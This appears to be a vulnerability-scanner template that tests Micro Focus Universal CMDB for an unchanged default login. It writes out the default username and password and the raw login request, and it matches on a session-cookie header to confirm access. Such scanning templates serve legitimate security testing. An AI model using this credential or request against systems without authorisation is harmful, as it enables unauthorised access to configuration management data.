id: ucmdb-default-login

info:
  name: Micro Focus Universal CMDB 默认口令登录（弱口令）
  author: dwisiswant0
  severity: high
  description: 该模板通过尝试 Micro Focus Universal CMDB 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://packetstormsecurity.com/files/161182/Micro-Focus-UCMDB-Remote-Code-Execution.htm
  classification:
    cwe-id: CWE-798
  metadata:
    max-request: 1
  tags: ucmdb,default-login,packetstorm,vuln

http:
  - raw:
      - |
        POST /ucmdb-ui/cms/loginRequest.do; HTTP/1.1
        Host: {{Hostname}}

        customerID=1&isEncoded=false&userName={{username}}&password={{base64(password)}}&ldapServerName=UCMDB

    attack: pitchfork
    payloads:
      username:
        - diagnostics
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "LWSSO_COOKIE_KEY"
